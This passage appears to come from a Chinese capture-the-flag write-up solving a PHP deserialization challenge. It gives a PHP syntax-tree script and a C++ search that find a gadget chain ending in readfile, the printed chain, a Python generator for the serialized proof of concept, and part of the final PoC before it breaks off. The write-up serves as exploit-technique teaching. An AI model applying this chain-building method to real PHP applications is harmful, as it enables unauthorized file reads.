$fp <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;function_list.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>);
$fo <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;deploy_list.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>);
$fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">fopen</span>(<span style="color:#e6db74">&#34;destination.txt&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>);
<span style="color:#66d9ef">foreach</span> ($stmts <span style="color:#66d9ef">as</span> $k <span style="color:#f92672">=&gt;</span> $class_point) {
    <span style="color:#66d9ef">if</span> ($class_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_Nop&#39;</span>)
        <span style="color:#66d9ef">continue</span>;
    <span style="color:#66d9ef">if</span> ($class_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_Class&#39;</span>){
        $class_name <span style="color:#f92672">=</span> $class_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
        $class_num<span style="color:#f92672">++</span>;
        <span style="color:#66d9ef">foreach</span> ($class_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stmts</span> <span style="color:#66d9ef">as</span> $kk <span style="color:#f92672">=&gt;</span> $subpoint) {
            <span style="color:#66d9ef">if</span> ($subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_Nop&#39;</span>)
                <span style="color:#66d9ef">continue</span>;
            <span style="color:#66d9ef">if</span> ($subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_Property&#39;</span>) {
                ;
            }
            <span style="color:#66d9ef">if</span> ($subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;Stmt_ClassMethod&#34;</span>) {
                $func_name <span style="color:#f92672">=</span> $subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                <span style="color:#66d9ef">if</span> ($func_name <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;__destruct&#39;</span>) {
                    $entrance <span style="color:#f92672">=</span> $class_name;
                    <span style="color:#66d9ef">break</span>;
                }
               <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>) {
                    <span style="color:#66d9ef">continue</span>;
                }
                $parms <span style="color:#f92672">=</span> $subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">params</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                <span style="color:#a6e22e">fwrite</span>($fp, $class_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$func_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
                $pass_way <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pass&#34;</span>;
                <span style="color:#66d9ef">foreach</span> ($subpoint<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stmts</span> <span style="color:#66d9ef">as</span> $kkk <span style="color:#f92672">=&gt;</span> $method_point) {
                    <span style="color:#66d9ef">if</span> ($method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_Expression&#39;</span>) {
                        $assign_1 <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                        $use_func <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>];
                        $assign_2 <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">args</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">value</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                        <span style="color:#66d9ef">if</span>($use_func <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
                            $assign_2 <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                            $use_func <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;pass&#34;</span>;
                        }
                        <span style="color:#66d9ef">else</span> {
                            $func_list[$use_func] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
                        }
                        <span style="color:#66d9ef">if</span>($assign_1 <span style="color:#f92672">!==</span> $assign_2) <span style="color:#66d9ef">break</span>;
                        $pass_way <span style="color:#f92672">=</span> $use_func;
                        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">in_array</span>($pass_way, <span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#34;sha1&#34;</span>, <span style="color:#e6db74">&#34;md5&#34;</span>, <span style="color:#e6db74">&#34;crypt&#34;</span>))) {
                            <span style="color:#66d9ef">break</span>;
                        }

                    } <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>($method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">gettype</span>() <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;Stmt_If&#39;</span>) {
                        <span style="color:#66d9ef">if</span> ($method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stmts</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parts</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;readfile&#34;</span>) {
                            <span style="color:#a6e22e">fwrite</span>($fd, $class_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$func_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$parms<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
                            <span style="color:#66d9ef">break</span>;
                        }
                        $use_obj <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stmts</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">var</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                        $use_func <span style="color:#f92672">=</span> $method_point<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">stmts</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">expr</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">name</span>;
                        <span style="color:#a6e22e">fwrite</span>($fo, $class_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$func_name<span style="color:#f92672">.</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">.</span>$use_obj<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>$use_func<span style="color:#f92672">.</span><span style="color:#e6db74">&#34; &#34;</span><span style="color:#f92672">.</span>$pass_way<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
                    }
                }
            }
        }
    }
}
<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;[+] filter done&#39;</span> <span style="color:#f92672">.</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
<span style="color:#66d9ef">echo</span> $entrance;
<span style="color:#a6e22e">fclose</span>($fp);
<span style="color:#a6e22e">fclose</span>($fo);
</code></pre></div><p>构建把所有类的名称，函数，终点的类的函数，以及函数调用关系分别存储起来。
其中有一些污点过滤，比如 md5, sha1, ucfirst, crypt 的调用直接无视，赋值两边参数不等的也直接无视，另外发现 base64 解码的时候出现的不可见字符也会对后面产生影响，故把所有进行 <code>base64_decode</code> 部分全部剪掉。</p>
<p>然后手动加一下 <code>__destruct</code> 在文件里，把这三个文件放在一起，然后用C语言寻找可行链。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
</span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
<span style="color:#75715e">#define mem(a,b) memset(a,b,sizeof(a))
</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span> LL;
<span style="color:#66d9ef">typedef</span> pair<span style="color:#f92672">&lt;</span>string, string<span style="color:#f92672">&gt;</span> PII;
<span style="color:#75715e">#define X first
</span><span style="color:#75715e">#define Y second
</span><span style="color:#75715e"></span><span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">read</span>() {
	<span style="color:#66d9ef">int</span> x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>, f <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; <span style="color:#66d9ef">char</span> c <span style="color:#f92672">=</span> getchar();
	<span style="color:#66d9ef">while</span>(<span style="color:#f92672">!</span>isdigit(c)){<span style="color:#66d9ef">if</span>(c <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;-&#39;</span>)f <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;c <span style="color:#f92672">=</span> getchar();}
	<span style="color:#66d9ef">while</span>(isdigit(c)){x <span style="color:#f92672">=</span> x <span style="color:#f92672">*</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">+</span> c<span style="color:#f92672">-</span><span style="color:#e6db74">&#39;0&#39;</span>; c <span style="color:#f92672">=</span> getchar();}
	<span style="color:#66d9ef">return</span> x <span style="color:#f92672">*</span> f;
}
<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">int</span> maxn <span style="color:#f92672">=</span> <span style="color:#ae81ff">20010</span>;
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Edge</span> {
	<span style="color:#66d9ef">int</span> u, v, next;
	PII w;
	Edge(){}
	Edge(<span style="color:#66d9ef">int</span> _1, <span style="color:#66d9ef">int</span> _2, <span style="color:#66d9ef">int</span> _3, string _4, string _5)<span style="color:#f92672">:</span> u(_1), v(_2), next(_3) {
		w <span style="color:#f92672">=</span> make_pair(_4,_5);
	}
}e[maxn<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>]; 
<span style="color:#66d9ef">int</span> first[maxn], ce <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, tot, tag[maxn];
string name[maxn], func[maxn], use[maxn];
<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">Class</span> {
	string name, func;
	Class() {}
	Class(string _1, string _2)<span style="color:#f92672">:</span>name(_1), func(_2) {}	
	<span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">operator</span> <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">const</span> Class <span style="color:#f92672">&amp;</span>s)<span style="color:#66d9ef">const</span>{
		<span style="color:#66d9ef">if</span>(name <span style="color:#f92672">==</span> s.name){
			<span style="color:#66d9ef">return</span> func <span style="color:#f92672">&lt;</span> s.func;
		}
		<span style="color:#66d9ef">return</span> name <span style="color:#f92672">&lt;</span> s.name;
	}
}a[maxn];
<span style="color:#66d9ef">int</span> pre[maxn], n;
PII prew[maxn]; 
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">addEdge</span>(<span style="color:#66d9ef">int</span> a,<span style="color:#66d9ef">int</span> b, string c,string d) {
	e[<span style="color:#f92672">++</span>ce] <span style="color:#f92672">=</span> Edge(a, b, first[a], c, d); first[a] <span style="color:#f92672">=</span> ce;
}	
map<span style="color:#f92672">&lt;</span>Class, <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> M;
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">match</span>(Class A,string use_func, string use_obj, string pass)
{
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;=</span> n; i<span style="color:#f92672">++</span>) {
		<span style="color:#66d9ef">if</span> (M[A] <span style="color:#f92672">==</span> i) <span style="color:#66d9ef">continue</span>;
		<span style="color:#66d9ef">if</span> (use_func <span style="color:#f92672">==</span> a[i].func) {
			addEdge(M[A], M[a[i]], use_obj, pass);
		}
	}
}
<span style="color:#66d9ef">bool</span> vis[maxn];
<span style="color:#66d9ef">int</span> count_chain;
<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">dfs</span>(<span style="color:#66d9ef">int</span> now, <span style="color:#66d9ef">int</span> fa) {
	vis[now] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
	<span style="color:#66d9ef">if</span> (tag[now]) {
		count_chain <span style="color:#f92672">++</span>;
		<span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> now;
		cout <span style="color:#f92672">&lt;&lt;</span> a[tmp].name <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">&lt;&lt;</span> a[tmp].func <span style="color:#f92672">&lt;&lt;</span> endl; 
		string use_obj <span style="color:#f92672">=</span> prew[tmp].X, pass_way <span style="color:#f92672">=</span> prew[tmp].Y;
		tmp <span style="color:#f92672">=</span> pre[tmp];
		<span style="color:#66d9ef">while</span>(tmp <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
			cout <span style="color:#f92672">&lt;&lt;</span> a[tmp].name <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">&lt;&lt;</span> a[tmp].func <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">&lt;&lt;</span> use_obj <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">&lt;&lt;</span> pass_way <span style="color:#f92672">&lt;&lt;</span> endl;
			use_obj <span style="color:#f92672">=</span> prew[tmp].X, pass_way <span style="color:#f92672">=</span> prew[tmp].Y;
			tmp <span style="color:#f92672">=</span> pre[tmp];
		}
		cout <span style="color:#f92672">&lt;&lt;</span> endl;
		<span style="color:#66d9ef">return</span>;
	}
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> first[now]; i <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>; i <span style="color:#f92672">=</span> e[i].next) {
		<span style="color:#66d9ef">if</span>(e[i].v <span style="color:#f92672">!=</span> fa <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span>vis[e[i].v]) {
			<span style="color:#66d9ef">if</span>(e[i].w.Y <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;base64_encode&#34;</span>)<span style="color:#66d9ef">continue</span>;
			<span style="color:#66d9ef">if</span>(e[i].w.Y <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ucfirst&#34;</span>)<span style="color:#66d9ef">continue</span>;
			pre[e[i].v] <span style="color:#f92672">=</span> now;
			prew[e[i].v] <span style="color:#f92672">=</span> e[i].w;
			dfs(e[i].v, now);
		}
	}
}
<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
	mem(first, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
	freopen(<span style="color:#e6db74">&#34;data.txt&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>, stdin);
	freopen(<span style="color:#e6db74">&#34;ans.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>, stdout);
	<span style="color:#66d9ef">int</span> start <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
	n <span style="color:#f92672">=</span> read();
	string params;
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;=</span> n; i<span style="color:#f92672">++</span>) {
		cin <span style="color:#f92672">&gt;&gt;</span> name[i] <span style="color:#f92672">&gt;&gt;</span> func[i];
		a[i] <span style="color:#f92672">=</span> Class(name[i], func[i]);
		M[a[i]] <span style="color:#f92672">=</span> i;
	} 	 
	<span style="color:#66d9ef">int</span> m <span style="color:#f92672">=</span> read();
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;i<span style="color:#f92672">&lt;=</span>m;i<span style="color:#f92672">++</span>){
		string class_name, func_name, use_obj, use_func, pass_way;
		cin <span style="color:#f92672">&gt;&gt;</span> class_name <span style="color:#f92672">&gt;&gt;</span> func_name <span style="color:#f92672">&gt;&gt;</span> use_obj <span style="color:#f92672">&gt;&gt;</span> use_func <span style="color:#f92672">&gt;&gt;</span> pass_way;<span style="color:#75715e">//$class_name.&#39; &#39;.$func_name.&#39; &#39;.$use_obj.&#34; &#34;.$use_func.&#34; &#34;.$pass_way
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">int</span> id <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; j <span style="color:#f92672">&lt;=</span> n; j<span style="color:#f92672">++</span>)
			<span style="color:#66d9ef">if</span> (class_name <span style="color:#f92672">==</span> name[j] <span style="color:#f92672">&amp;&amp;</span> func_name <span style="color:#f92672">==</span> func[j]) {
				id <span style="color:#f92672">=</span> j;
				<span style="color:#66d9ef">break</span>;
			}
		match(a[id], use_func, use_obj, pass_way);
	}
	<span style="color:#66d9ef">int</span> o <span style="color:#f92672">=</span> read();
	<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; i <span style="color:#f92672">&lt;=</span> o; i<span style="color:#f92672">++</span>) {
		string x, y, z;
		cin <span style="color:#f92672">&gt;&gt;</span> x <span style="color:#f92672">&gt;&gt;</span> y <span style="color:#f92672">&gt;&gt;</span> z;
		<span style="color:#66d9ef">int</span> id <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
		<span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>; j <span style="color:#f92672">&lt;=</span> n; j<span style="color:#f92672">++</span>)
			<span style="color:#66d9ef">if</span>(x <span style="color:#f92672">==</span> name[j] <span style="color:#f92672">&amp;&amp;</span> y <span style="color:#f92672">==</span> func[j]) {
				id<span style="color:#f92672">=</span>j;
				<span style="color:#66d9ef">break</span>;
			}
		<span style="color:#66d9ef">if</span>(id<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>)cout<span style="color:#f92672">&lt;&lt;</span>x<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">&lt;&lt;</span>y<span style="color:#f92672">&lt;&lt;</span>endl;
		tag[id] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
	}
	pre[start] <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
	dfs(start, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
	cout<span style="color:#f92672">&lt;&lt;</span>count_chain;
	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p>刚好只有一条可行链，倒序打印链：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plain" data-lang="plain">AN9pNsmlT Fhh5TZoD0
Ugh4SYk00D bLqi60vf tQF7ER str_rot13
xEFW8yw08 gvgCPyi nYuAuh2 str_rot13
Xl5V1fEbzD Z5G5uz fgVgm4TV97 pass
d9vgRnlEA trZx9DLGq T4rUU9R base64_decode
Ronyv7u Uaxr3XOrz uDQ0ehd4p strrev
T6Y5QYS GP5h5gz p9mwE7l str_rot13
SKVnfvfbas gkbXYD UOvWbl pass
o5d0ioNZ vBmg2S exGoDOPm str_rot13
FK0LfIlrxm uxVcfoc gZ9IzdbF6T pass
eHSt3I5L30 YbMfp8D9 exoEH1 pass
c76So3oF EttYcl6 cwQWOIEL strrev
u1q3m04qZb EtQ6pQB NGIlAGGLv pass
xT506K QiVLzL Dblxvn pass
p6NArTi YgmXN30 VbpsE7wqUH base64_decode
ezlgUUHCdQ lwUpo3 fDViVU pass
uGnuU5pGgQ cc60Kte4Em XbW5o6yiGv base64_decode
GGcIkQ6E a2l0Eeqr CK5OgoyC strrev
vS1qenzGWr kR5Y66g yrVWMn9 pass
amg2Vw __destruct PCR49GlRM pass
</code></pre></div><p>根据上述链的写脚本构造 poc：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">fp <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;popchain.txt&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span>)
fo <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#39;poc.php&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)
fo<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;&lt;?php</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">namespace christmasTree{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
line_list <span style="color:#f92672">=</span> []
<span style="color:#66d9ef">for</span> line <span style="color:#f92672">in</span> fp<span style="color:#f92672">.</span>readlines():
    line <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>)
    line_list<span style="color:#f92672">.</span>append(line)
line_list <span style="color:#f92672">=</span> line_list[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
<span style="color:#66d9ef">for</span> i, line <span style="color:#f92672">in</span> enumerate(line_list[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]):
    class_name, func_name, use_obj, _ <span style="color:#f92672">=</span> line<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
    <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        start_point <span style="color:#f92672">=</span> class_name
    next_name <span style="color:#f92672">=</span> line_list[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)[<span style="color:#ae81ff">0</span>]
    print(class_name, func_name, use_obj, next_name)
    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;class </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">{
</span><span style="color:#e6db74">        public $</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">;
</span><span style="color:#e6db74">        public function __construct(){
</span><span style="color:#e6db74">            $this-&gt;</span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> = new </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">();
</span><span style="color:#e6db74">        }
</span><span style="color:#e6db74">    }
</span><span style="color:#e6db74">    &#39;&#39;&#39;</span> <span style="color:#f92672">%</span> (class_name, use_obj, use_obj, next_name)
    fo<span style="color:#f92672">.</span>write(payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
class_name, func_name <span style="color:#f92672">=</span> line_list[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39; &#39;</span>)
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;class </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">{
</span><span style="color:#e6db74">        public $</span><span style="color:#e6db74">%s</span><span style="color:#e6db74">;
</span><span style="color:#e6db74">    }
</span><span style="color:#e6db74">    &#39;&#39;&#39;</span> <span style="color:#f92672">%</span> (class_name, use_obj)
fo<span style="color:#f92672">.</span>write(payload <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">echo urlencode(serialize(new </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">()));}&#39;</span> <span style="color:#f92672">%</span> start_point)
print(class_name, func_name)
</code></pre></div><p>生成的 poc 不能直接打通，因为要求类内所有 public 属性都要进行赋值，对生成的 poc 还需要手动修改，对未利用的对象赋为 <code>stdClass()</code>
最终的poc：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">namespace</span> <span style="color:#a6e22e">christmasTree</span>{
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">amg2Vw</span>{
        <span style="color:#66d9ef">public</span> $PCR49GlRM;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">PCR49GlRM</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">vS1qenzGWr</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">vS1qenzGWr</span>{
        <span style="color:#66d9ef">public</span> $yrVWMn9;
    <span style="color:#66d9ef">public</span> $S839pvNRU;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">yrVWMn9</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">GGcIkQ6E</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">S839pvNRU</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">GGcIkQ6E</span>{
        <span style="color:#66d9ef">public</span> $CK5OgoyC;
    <span style="color:#66d9ef">public</span> $Vkyud3;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">CK5OgoyC</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">uGnuU5pGgQ</span>();
            $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Vkyud3</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\stdClass</span>();
        }
    }
    
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">uGnuU5pGgQ</span>{
        <span style="color:#66d9ef">public</span> $XbW5o6yiGv;
    <span style="color:#66d9ef">public</span> $XEH9BQ;
        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct(){
